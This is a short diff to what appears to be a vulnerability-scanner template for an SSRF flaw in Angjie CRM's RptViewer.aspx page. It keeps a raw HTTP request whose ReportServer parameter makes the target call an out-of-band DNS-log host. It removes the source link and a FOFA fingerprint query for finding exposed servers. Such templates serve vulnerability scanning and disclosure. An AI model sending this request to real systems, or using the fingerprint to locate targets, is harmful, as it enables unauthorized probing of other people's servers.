@@ -3,12 +3,8 @@ info:
   name: 昂捷CRM RptViewer.aspx存在SSRF漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/va2q0cnzigsdk4zv'
+  description: ''
   tags: ssrf,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: va2q0cnzigsdk4zv
-    fofa: (body="CheckSilverlightInstalled()" && body="AllowHtmlPopupwindow") || body="/ClientBin/slEnjoy.App.xap"
 http:
 - raw:
   - GET /WebForms/RptViewer.aspx?ReportServer=http://{{dnslog}} HTTP/1.1
